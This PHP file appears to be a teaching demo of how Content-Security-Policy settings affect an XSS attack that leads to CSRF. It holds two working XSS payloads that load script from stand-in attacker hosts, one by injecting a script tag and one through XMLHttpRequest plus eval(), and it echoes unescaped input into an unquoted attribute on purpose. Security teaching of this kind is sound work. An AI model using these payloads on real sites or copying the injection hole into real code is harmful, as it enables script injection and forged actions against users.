<?php
/*
	CSRF/XSS and CSP demo.
	This demo aims to show how CSP configuration is important when dealing against XSS flows that trigger script inclusion into the DOM or execute it directly from an inline payload (with eval() for example).
	The goal of the attack is to use an XSS flow located at the bottom of this page through the 'evil' GET parameter, and lead it to a CSRF exploitation. 
	The payload will force the user to interact with the csrf_post.php file (could be any privileged functionnality in the real world) by executing a script file which also bypasses the CSRF token protection in that same file.
*/
// Choose the CSP context (1, 2, 3, 4 or 5 ).
$CSP = 1;
// Choose the payload (1 or 2).
$payload = 1;

// #1 Totally unsafe CSP. Allows any origin for any content. Allows inline code and eval().

// Payload 1: Successful.
// Payload 2: Successful.

switch ($CSP){
	case 1:
	header("Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'");
	break;

	// #2 Allows scripts only from self, the rest is allowed by default. Allows inline code and eval().

	// Payload 1: Successful.
	// Payload 2: Successful since the script-src 'self' doesn't apply to XMLHttpRequests. Here default-src or connect-src should be implemented.
	case 2:
	header("Content-Security-Policy: script-src 'self' 'unsafe-inline'  'unsafe-eval';");
	break;

	// #3 Allows scripts only from self, the rest is allowed by default. Allows inline code.

	// Payload 1: Successful.
	// Payload 2: Not successful because eval() is not allowed.
	case 3:
	header("Content-Security-Policy: script-src 'self' 'unsafe-inline' ;");
	break;

	// #4 Everything is allowed only from self by default. Inline code and eval() are not allowed.

	// Payload 1: Successful.
	// Payload 2: Not successful because default-src applies to connect-src, then ajax calls are not allowed to any other domain than self, also eval() is not allowed.
	case 4:
	header("Content-Security-Policy: default-src 'self' 'unsafe-inline'; ");
	break;

	// #5 Now everything only allowed from self. Inline code and eval() are not allowed.

	// Payload 1: Not successful because payload is inline code.
	// Payload 2: Not successful because payload is inline code.
	case 5:
	header("Content-Security-Policy: default-src 'self';");
	break;

	default:
	die("Choose a CSP from 1 to 5.");
	break;

}
?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
</head>
<body>
	<?php

		$_GET["evil"] = "";

		switch ($payload){

		/*
			PAYLOAD #1
			Script is located in the same domain.
			Adds a new script tag in the <head></head>. 
			Uses the src attribute and DOM manipulation.

			Successful when: 
			- the 'unsafe-inline' directive is present.
		*/
			case 1:
		
			$_GET["evil"] = "nothing😀  onfocus='
			var tag = document.createElement(\"script\"); 
			tag.src = \"http://secdev:5555/evil/csrf\";
			document.getElementsByTagName(\"head\")[0].appendChild(tag);' autofocus";

			break;
		

		/*
			PAYLOAD #2
			Script is located on the attacker's domain.
			Loads the code with Ajax, executes it with eval().

			Successful when: 
			- default-src/connect-src allowed for the attacker's domain.
			- the 'unsafe-eval' directive is present.
			- the 'unsafe-inline' directive is present.
		*/
			case 2:
		
			$_GET["evil"] = "nothing😀  onfocus='
			var request = new XMLHttpRequest(); 
			request.onreadystatechange = function(){
				if (this.readyState === XMLHttpRequest.DONE){
					eval(this.responseText);
				}
			}; 
			request.open(\"GET\",\"http://evil-secdev:5555/csrf.js\"); 
			request.send();' 

			autofocus";
			break;

			default:
			$_GET["evil"] = "";
			break;
		}
		
		//Bad escaping function causes XSS...
		$dangerousData = htmlentities($_GET["evil"], ENT_QUOTES, "UTF-8");
		//...especially when using no quotes on attribute's value !
		echo "<input value=" .$_GET["evil"].">";
	?>
</body>
</html>